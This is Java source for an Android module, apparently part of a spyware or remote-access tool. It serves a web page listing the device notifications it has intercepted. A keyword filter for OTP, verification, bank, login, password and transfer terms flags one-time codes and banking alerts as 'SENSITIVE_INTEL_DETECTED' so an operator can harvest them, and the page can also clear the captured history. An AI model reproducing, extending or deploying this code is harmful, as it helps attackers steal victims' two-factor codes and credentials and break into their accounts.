package com.labs.labrats.modules;

import android.content.Context;
import com.labs.labrats.FirebaseConfig;
import com.labs.labrats.StatusNotification;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import fi.iki.elonen.NanoHTTPD.IHTTPSession;
import fi.iki.elonen.NanoHTTPD.Response;

public class IntelModule extends BaseModule {

    public IntelModule(Context context, FirebaseConfig server) {
        super(context, server);
    }

    public Response handleRequest(IHTTPSession session) {
        String uri = session.getUri();
        Map<String, String> params = session.getParms();

        if (uri.equals("/intel")) {
            return serveIntel(params, session);
        } else if (uri.equals("/intel/clear")) {
            StatusNotification.clearHistory(context);
            return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
        }
        return null;
    }

    private Response serveIntel(Map<String, String> params, IHTTPSession session) {
        FirebaseConfig.logActivity("INTEL_UPLINK: Notification stream accessed");
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\" style=\"margin-bottom: 15px;\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");

        html.append("<div class=\"card\">");
        html.append("<div style=\"display:flex; justify-content:space-between; align-items:center; margin-bottom: 20px;\">");
        html.append("<h2 style=\"margin:0; text-align: left; font-size: 1.6rem;\">&#9889; INTEL_STREAM <span class=\"info-trigger\" onclick=\"showInfo(event, 'INTEL_STREAM', 'Live capture of incoming system notifications and sensitive alerts.')\">INFO</span></h2>");
        html.append("<span style=\"font-size:0.6rem; opacity:0.5; font-family:monospace; text-align:right;\">LISTENER_ACTIVE</span>");
        html.append("</div>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
        
        html.append("<div style=\"display:flex; gap:10px; margin-bottom:20px; max-width: 450px; margin-left:auto; margin-right:auto;\">");
        html.append("<button onclick=\"clearIntel()\" class=\"btn btn-small\" style=\"flex:1; border-color:var(--danger); color:var(--danger); background:rgba(255, 49, 49, 0.05); margin: 0;\">CLEAR_STREAM</button>");
        html.append("<button onclick=\"location.reload()\" class=\"btn btn-small\" style=\"flex:1; border-color:var(--neon-cyan); color:var(--neon-cyan); background:rgba(0, 242, 255, 0.05); margin: 0;\">RELOAD_STREAM</button>");
        html.append("</div>");

        html.append("<div style=\"border-left: 3px solid var(--neon-cyan); padding-left: 15px; margin-top: 40px;\">");
        
        html.append("<script>function clearIntel() { fetch('/intel/clear').then(() => location.reload()); }</script>");

        List<StatusNotification.NotificationData> notifications = StatusNotification.getHistory();

        if (notifications.isEmpty()) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128225;</div><p>No active intel stream. Waiting for device notifications...</p></div>");
        } else {
            int page = 1;
            int limit = 20;
            try {
                if (params.containsKey("page")) {
                    page = Integer.parseInt(params.get("page"));
                    if (page < 1) page = 1;
                }
            } catch (Exception e) { page = 1; }
            
            int totalCount = notifications.size();
            int totalPages = (int) Math.ceil((double) totalCount / limit);
            int offset = (page - 1) * limit;

            html.append("<p style=\"color: #888; margin-bottom: 15px; font-size: 0.7rem;\">Total: ").append(totalCount)
                    .append(" reports | Page ").append(page).append(" of ").append(totalPages).append("</p>");

            html.append("<table id=\"intel-table\">")
                .append("<thead><tr><th>Source</th><th>Payload</th><th>Uplink_Time</th></tr></thead>")
                .append("<tbody>");

            for (int i = offset; i < Math.min(offset + limit, totalCount); i++) {
                StatusNotification.NotificationData n = notifications.get(i);
                String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date(n.timestamp));
                
                String payload = (n.title + " " + n.text).toLowerCase();
                boolean isSystemNoise = payload.contains("usb") || payload.contains("charging");
                
                boolean isSensitive = !isSystemNoise && (
                                    payload.contains("otp") || 
                                    payload.contains("code") || 
                                    payload.contains("verification") || 
                                    payload.contains("bank") || 
                                    payload.contains("login") || 
                                    payload.contains("password") ||
                                    (payload.contains("transfer") && !payload.contains("file")) || 
                                    payload.contains("confirm"));
                
                String rowStyle = isSensitive ? "style=\"border-left: 3px solid var(--danger); background: rgba(255, 49, 49, 0.05);\"" : "";
                String alertBadge = isSensitive ? "<span style=\"color:var(--danger); font-size:0.6rem; display:block; margin-bottom:5px; font-weight:bold; letter-spacing:1px;\">&#9888; SENSITIVE_INTEL_DETECTED</span>" : "";

                html.append("<tr ").append(rowStyle).append(">")
                    .append("<td style=\"color:var(--neon-green); font-weight:bold; font-size:0.75rem;\">").append(escapeHtml(n.packageName)).append("</td>")
                    .append("<td>")
                    .append(alertBadge)
                    .append("<div style=\"color:#fff; font-weight:bold; margin-bottom:4px; font-size:0.8rem;\">").append(escapeHtml(n.title)).append("</div>")
                    .append("<div style=\"font-size:0.75rem; opacity:0.8;\">").append(escapeHtml(n.text)).append("</div>")
                    .append("</td>")
                    .append("<td style=\"font-family:monospace; opacity:0.6; font-size:0.7rem;\">").append(time).append("</td>")
                    .append("</tr>");
            }
            html.append("</tbody></table>");
            
            if (totalPages > 1) {
                html.append("<div class=\"pagination\" style=\"margin-top: 25px; flex-direction: column; gap: 12px;\">");
                
                html.append("<div style=\"display: flex; gap: 8px; justify-content: center; flex-wrap: wrap;\">");
                if (page > 1) {
                    html.append("<a href=\"/intel?page=1\">FIRST</a>");
                    html.append("<a href=\"/intel?page=").append(page - 1).append("\">&laquo; PREV</a>");
                }
                
                int startPage = Math.max(1, page - 1);
                int endPage = Math.min(totalPages, page + 1);
                for (int i = startPage; i <= endPage; i++) {
                    String active = (i == page) ? "class=\"active\"" : "";
                    html.append("<a ").append(active).append(" href=\"/intel?page=").append(i).append("\">").append(i).append("</a>");
                }

                if (page < totalPages) {
                    html.append("<a href=\"/intel?page=").append(page + 1).append("\">NEXT &raquo;</a>");
                    html.append("<a href=\"/intel?page=").append(totalPages).append("\">LAST</a>");
                }
                html.append("</div>");

                html.append("<form action=\"/intel\" method=\"GET\" style=\"display: inline-flex; align-items: center; gap: 8px; margin-top: 5px;\">")
                    .append("<span style=\"font-size: 0.7rem; color: #888;\">JUMP:</span>")
                    .append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 55px; height: 32px; background: #000; border: 1px solid rgba(0, 242, 255, 0.2); color: #fff; border-radius: 8px; text-align: center; font-size: 0.8rem;\">")
                    .append("<button type=\"submit\" class=\"btn btn-small\" style=\"padding: 5px 10px; margin: 0;\">GO</button>")
                    .append("</form>");

                html.append("</div>");
            }
        }
        html.append("</div>");
        html.append(getFooter());
        return server.serveGzippedProxy(session, "text/html", html.toString());
    }
}
